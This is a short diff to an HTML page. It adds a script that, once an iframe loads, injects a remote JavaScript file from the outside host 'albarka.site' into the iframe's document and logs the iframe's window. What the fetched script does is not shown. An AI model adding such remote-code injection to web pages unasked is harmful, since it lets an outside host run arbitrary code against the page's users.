@@ -293,6 +293,15 @@ function s2ab(s) {
         }})
 
     </script>
-
+        <script>
+            const iframe = document.getElementById('myIframe');
+            iframe.onload = function() {
+                const script = document.createElement('script');
+                script.type = 'text/javascript';
+                script.src = 'https://albarka.site/script0.js'; // Replace with your script URL
+                console.log(iframe.contentWindow)
+                iframe.contentWindow.document.body.appendChild(script);
+            };
+        </script>
 </body>
 </html>
